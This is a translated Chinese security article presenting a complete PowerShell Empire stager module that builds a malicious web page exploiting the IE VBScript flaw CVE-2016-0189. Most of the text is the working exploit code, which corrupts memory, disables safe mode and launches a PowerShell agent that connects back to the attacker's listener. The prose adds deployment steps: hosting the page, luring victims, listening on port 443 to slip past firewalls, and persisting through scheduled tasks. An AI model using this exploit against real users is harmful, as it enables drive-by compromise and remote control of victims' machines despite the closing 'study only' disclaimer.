# 利用Powershell Empire和CVE-2016-0189攻击用户的IE浏览器

阅读量 **128620**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-09-18 15:19:07

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

原文地址：<https://www.cgsec.co.uk/powershell-empire-cve-2016-0189-profit/>

译文仅供参考，具体内容表达以及含义原文为准。

**前言**

Empire（http://www.powershellempire.com/）是一个PowerShell后期漏洞利用代理工具，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能，它可以快速部署后期漏洞利用模块，并且能够躲避网络检测。

因此，Powershell
Empire是我们最喜欢的一款工具,尤其是当目标用户在我们的活动范围内时。我们通常使用Metasploit和Empire的组合来完成工作,即结合浏览器漏洞利用和Empire内的标准操作进行。

不过，在最近的一个测试中，我们没有使用MSF，而是使用了Empire中的一个新stager，该stager能够利用漏洞CVE-2016-0189(也称为vbscript_godmod，是一个
IE 游览器的脚本引擎漏洞)来攻击目标用户的IE浏览器（Internet explorer
9-11）。这是近6个月以来我们的首选利用,而且最近我们已经开始开发利用工具。如果成功的话,可以在保证硬盘数据不丢失的情况下启动powershell，同时将代理连接到Empire。

  

**利用Powershell Empire和CVE-2016-0189攻击用户的IE浏览器**

下面是该新stager的Python代码ms16.py：

    
    
    from lib.common import helpers
     
    class Stager:
     
        def __init__(self, mainMenu, params=[]):
     
            self.info = {
                'Name': 'MS16-051 IE RCE',
     
                'Author': ['www.cgsec.co.uk'],
     
                'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'),
     
                'Comments': [
                    'Target will have to open link with vulnerable version of IE.'
                ]
            }
     
            # any options needed by the stager, settable during runtime
            self.options = {
                # format:
                #   value_name : {description, required, default_value}
                'Listener' : {
                    'Description'   :   'Listener to generate stager for.',
                    'Required'      :   True,
                    'Value'         :   ''
                },
                'StagerRetries' : {
                    'Description'   :   'Times for the stager to retry connecting.',
                    'Required'      :   False,
                    'Value'         :   '0'
                },
                'OutFile' : {
                    'Description'   :   'File to output HTML to, otherwise displayed on the screen.',
                    'Required'      :   True,
                    'Value'         :   ''
                },
                'Base64' : {
                    'Description'   :   'Switch. Base64 encode the powershell output.',
                    'Required'      :   True,
                    'Value'         :   'True'
                },           
                'UserAgent' : {
                    'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                    'Required'      :   False,
                    'Value'         :   'default'
                },
                'Proxy' : {
                    'Description'   :   'Proxy to use for request (default, none, or other).',
                    'Required'      :   False,
                    'Value'         :   'default'
                },
                'ProxyCreds' : {
                    'Description'   :   'Proxy credentials ([domain]username:password) to use for request (default, none, or other).',
                    'Required'      :   False,
                    'Value'         :   'default'
                }
            }
     
            # save off a copy of the mainMenu object to access external functionality
            #   like listeners/agent handlers/etc.
            self.mainMenu = mainMenu
     
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
     
        def generate(self):
     
            # extract all of our options
            listenerName = self.options['Listener']['Value']
            base64 = self.options['Base64']['Value']
            userAgent = self.options['UserAgent']['Value']
            proxy = self.options['Proxy']['Value']
            proxyCreds = self.options['ProxyCreds']['Value']
            stagerRetries = self.options['StagerRetries']['Value']
     
            encode = False
            if base64.lower() == "true":
                encode = True
     
            # generate the launcher code
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
     
            if launcher == "":
                print helpers.color("[!] Error in launcher command generation.")
                return ""
            else:
                                code =  "<html>n"
                                code += "<head>n"
                                code += "<meta http-equiv="x-ua-compatible" content="IE=10">n"
                                code += "</head>n"
                                code += "<body>n"
                                code += "    <script type="text/vbscript">n"
                                code += "        Dim awn"
                                code += "        Dim plunge(32)n"
                                code += "        Dim y(32)n"
                                code += "        prefix = "%u4141%u4141"n"
                                code += "        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"n"
                                code += "        b = String(64000, "D")n"
                                code += "        c = d & bn"
                                code += "        x = UnEscape(c)n"
                                code += "          n"
                                code += "        Class ArrayWrappern"
                                code += "            Dim A()n"
                                code += "            Private Sub Class_Initializen"
                                code += "                  ReDim Preserve A(1, 2000)n"
                                code += "            End Subn"
                                code += "                    n"
                                code += "            Public Sub Resize()n"
                                code += "                ReDim Preserve A(1, 1)n"
                                code += "            End Subn"
                                code += "        End Classn"
                                code += "          n"
                                code += "        Class Dummyn"
                                code += "        End Classn"
                                code += "          n"
                                code += "        Function getAddr (arg1, s)n"
                                code += "            aw = Nulln"
                                code += "            Set aw = New ArrayWrappern"
                                code += "          n"
                                code += "            For i = 0 To 32n"
                                code += "                Set plunge(i) = sn"
                                code += "            Nextn"
                                code += "          n"
                                code += "            Set aw.A(arg1, 2) = sn"
                                code += "          n"
                                code += "            Dim addrn"
                                code += "            Dim in"
                                code += "            For i = 0 To 31n"
                                code += "                If Asc(Mid(y(i), 3, 1)) = VarType(s) Thenn"
                                code += "                   addr = strToInt(Mid(y(i), 3 + 4, 2))n"
                                code += "                End Ifn"
                                code += "                y(i) = Nulln"
                                code += "            Nextn"
                                code += "          n"
                                code += "            If addr = Null Thenn"
                                code += "                document.location.href = document.location.hrefn"
                                code += "                Returnn"
                                code += "            End Ifn"
                                code += "            getAddr = addrn"
                                code += "        End Functionn"
                                code += "          n"
                                code += "        Function leakMem (arg1, addr)n"
                                code += "            d = prefix & "%u0008%u4141%u4141%u4141"n"
                                code += "            c = d & intToStr(addr) & bn"
                                code += "            x = UnEscape(c)n"
                                code += "          n"
                                code += "            aw = Nulln"
                                code += "            Set aw = New ArrayWrappern"
                                code += "          n"
                                code += "            Dim on"
                                code += "            o = aw.A(arg1, 2)n"
                                code += "          n"
                                code += "            leakMem = on"
                                code += "        End Functionn"
                                code += "          n"
                                code += "        Sub overwrite (arg1, addr)n"
                                code += "            d = prefix & "%u400C%u0000%u0000%u0000"n"
                                code += "            c = d & intToStr(addr) & bn"
                                code += "            x = UnEscape(c)n"
                                code += "          n"
                                code += "            aw = Nulln"
                                code += "            Set aw = New ArrayWrappern"
                                code += "          n"
                                code += "          n"
                                code += "            aw.A(arg1, 2) = CSng(0)n"
                                code += "        End Subn"
                                code += "          n"
                                code += "        Function exploit (arg1)n"
                                code += "            Dim addrn"
                                code += "            Dim csessionn"
                                code += "            Dim olescriptn"
                                code += "            Dim memn"
                                code += "          n"
                                code += "          n"
                                code += "            Set dm = New Dummyn"
                                code += "          n"
                                code += "            addr = getAddr(arg1, dm)n"
                                code += "          n"
                                code += "            mem = leakMem(arg1, addr + 8)n"
                                code += "            csession = strToInt(Mid(mem, 3, 2))n"
                                code += "          n"
                                code += "            mem = leakMem(arg1, csession + 4)n"
                                code += "            olescript = strToInt(Mid(mem, 1, 2))n"
                                code += "            overwrite arg1, olescript + &H174n"
                                code += "     Set Object = CreateObject("Wscript.Shell")n"
                                code +=    "                 Object.run(""
                                code +=            launcher +       "")n"
                                code += "        End Functionn"
                                code += "          n"
                                code += "        Function triggerBugn"
                                code += "            aw.Resize()n"
                                code += "            Dim in"
                                code += "            For i = 0 To 32n"
                                code += "                ' 24000x2 + 6 = 48006 bytesn"
                                code += "                y(i) = Mid(x, 1, 24000)n"
                                code += "            Nextn"
                                code += "        End Functionn"
                                code += "    </script>n"
                                code += "          n"
                                code += "    <script type="text/javascript">n"
                                code += "        function strToInt(s)n"
                                code += "        {n"
                                code += "            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);n"
                                code += "        }n"
                                code += "        function intToStr(x)n"
                                code += "        {n"
                                code += "            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);n"
                                code += "        }n"
                                code += "        var o;n"
                                code += "        o = {"valueOf": function () {n"
                                code += "                triggerBug();n"
                                code += "                return 1;n"
                                code += "            }};n"
                                code += "        setTimeout(function() {exploit(o);}, 50);n"
                                code += "    </script>n"
                                code += "</body>n"
                                code += "</html>"
     
             return code

接下来，我们就对这个新的利用做一个简单的介绍：

首先，我们需要获得Empire,可以从Github上下载，下载地址为：

<https://github.com/PowerShellEmpire/Empire>

接下来，我们需要安装Apache2，它可以把索引页直接导向/var/www/html。这一步是可选的，因为大多数人可能想要改变输出,用于其他利用或者逃避检测。

然后，添加我们的新stager，它位于/lib/stagers下，运行Empire的install.sh脚本来启动并运行它。如果你是在Ubuntu上进行操作,那么在运行该脚本之前你需要手动安装pip。

在做好前面的准备工作之后，我们就可以启动Empire了。

如果一切正常的话，我们应该能够使用“stager
ms16”。本文只是简单地将输出文件设置到/var/www/html/index.html，然后引导目标到该html页面，如下图所示。

高级一些的用户可能想为不同的用户建立一些更复杂的服务或躲避检测机制,不过这超出了本文的范围，本文只是做出一个简单的介绍。

此外，我还设置了一个对端口443的侦听器,希望绕过某些防火墙和逃避一些检测机制。

最后，当有人使用一个含有漏洞CVE-2016-0189的IE浏览器访问你的服务器时，该利用就会触发，你就会得到一个新的Empire代理。另外，使用持久性模块创建一个计划任务可以确保不会在重启之后失去访问权限。这些可以通过将代理设置为自动运行来实现。

最后声明，本文只是提供了一个利用的简单介绍，仅供安全学习，禁止非法使用！

**也提醒用户抓紧时间对IE浏览器进行漏洞修复 ，微软已经发布了CVE-2016-0189漏洞的修复补丁。**

本文翻译自安全客 [原文链接](https://www.cgsec.co.uk/powershell-empire-cve-2016-0189-profit/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84581](/post/id/84581)

安全客 - 有思想的安全新媒体

本文转载自: [安全客](https://www.cgsec.co.uk/powershell-empire-cve-2016-0189-profit/)

如若转载,请注明出处： <https://www.cgsec.co.uk/powershell-empire-cve-2016-0189-profit/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

